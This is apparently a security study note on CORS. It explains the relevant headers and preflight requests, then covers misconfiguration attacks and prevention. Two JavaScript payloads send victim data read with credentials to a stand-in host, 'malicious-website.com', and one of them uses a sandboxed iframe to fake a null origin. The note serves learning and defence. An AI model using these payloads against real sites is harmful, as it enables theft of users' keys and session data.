### General Notes

Browser mechanism that enables controlled access to resources located outside of a domain, and adds flexibility to [[Same Origin Policy (SOP)]].
- The CORS [[Protocol]] uses [[HTTP#Header]]s that define trusted origins, and properties for each with given [[Authentication]] and [[Access Control]] permissions.

CORS relaxes the [[Same Origin Policy (SOP)]] for [[HTTP]] requests between websites with different domains through the use of HTTP headers.

> CORS doesn't protect against [[Cross Site Request Forgery (CSRF)]].

---
### `Access-Control-Allow-Origin` (ACAO) response header

To enable cross-origin communication, the `access-control-allow-origin` header is returned in the response from a website to the requesting website.
- This header identifies the permitted origin.
- The browser then compares the value in the header with the requesting website origin, and if they match, permits access.

This header is returned by a server when a website requests resources across domains with the `Origin` header.
- The browser compares values in this header with the requesting web `Origin` header and gives permissions.
- If they match, then cross-origin communication is allowed.

The `Access-Control-Allow-Origin` header can have values of:
* Multiple origins. (No browser supports this).
* `null`
* `*`

##### Transferring [[Cookies]], [[Certificates]], and Credentials

CORS allows for sharing credentials or authorization [[Cookies]] through the response header `Access-Control-Allow-Credentials` (ACAC).
- If it is set to true in the response, then the cookies being sent in the request will be allowed to be read.

 >Using the header `Access-Control-Allow-Origin` set to the value `*` cannot be combined with `Access-Control-Allow-Credentials` set to `true`.

##### Pre-Flight Checks

When a cross-domain request uses a non standard [[HTTP]] method or headers, this request is preceded by one with the `OPTIONS` method, and an initial check is made regarding the permitted methods and headers.
- The server returns allowed methods and the trusted origin.
- A cross-domain request will be first preceded by `OPTIONS` request with the method and headers used of this request.
- The server responds with the allowed origin, the allowed methods, the allowed verbs, and the caching time of the preflight response.

> Used to protect legacy resources.

---
### CORS Vulnerabilities

Some applications simply read the `origin` header from the incoming request, and then respond with the ACAO header set to the value in that `origin` header.
- They can also respond with the ACAC header to allow including [[Cookies]].

- If a [[Cross Site Request Forgery (CSRF)]] token or [[Application Programming Interface (API)]] key is included in the response, use this payload to steal the data of another user. They must view this code or click on it for it to work for them, and sends us their data.
```JavaScript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true;
req.send(); 

function reqListener() { 
	location='//malicious-website.com/log?key='+this.responseText; 
};
```

##### Error parsing Origin headers

Supporting multiple origins usually works by having a whitelist.
- A request with the origin header has its value compared against whitelist, if it is found, then the ACAO header is added to the response.

This matching with the whitelist can be played around by appending to the end or the beginning, or by using [[Regular Expressions]].
* The beginning by testing if it allows all subdomains.
* To the end if it simply checks the required origin is present.

> Sometimes the value `null` is whitelisted.

Browsers can send `null` in the origin header in:
* Cross-origin redirects.
* Requests from serialized data.
* Requests using `file:` [[Protocol]].
* Sandboxed cross-origin requests.

If the server responds with ACAO with value `null`, then we can bypass it by generating a cross-origin request containing `null` in the origin header satisfying the whitelist.

- Adding the payload we have in an `iframe` sandbox will appear as if it is coming from the null origin.
```HTML
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script> var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','vulnerable-website.com/sensitive-victim-data',true); 
req.withCredentials = true; 
req.send(); 
	   
function reqListener() { 
	location='malicious-website.com/log?key='+this.responseText; 
}; </script>">
</iframe>
```

##### Exploiting [[Cross Site Scripting (XSS)]] via CORS

If a website trusts an origin that is vulnerable to [[Cross Site Scripting (XSS)]], attacker can inject JavaScript that uses CORS.

- Given the following request:
```
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://subdomain.vulnerable-website.com 
Cookie: sessionid=...
```

- If the server responds with:
```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com 
Access-Control-Allow-Credentials: true
```

- Then an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like:
```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```
> `cors-stuff` is the CORS payload that issues a request above. [[Cross-Origin Resource Sharing (CORS)#CORS Vulnerabilities]].

##### Breaking [[Transport Layer Security (TLS)]]

Application that has [[HTTPS]] whitelists a subdomain using [[HTTP]].
- Attackers that can intercept traffic between these two locations can compromise the victims interaction with the application.

> Methodology: [(TLS)](https://portswigger.net/web-security/cors#breaking-tls-with-poorly-configured-cors).

---
### Preventing CORS

* Proper configuration of cross-origin requests with the properly specified ACAO headers.
* Only allow trusted websites with the headers.
* Avoid whitelisting the `null` value in the ACAO header.
* Avoid wildcards in internal networks. (`*`).
* Not a replacement for server-side protection.

---
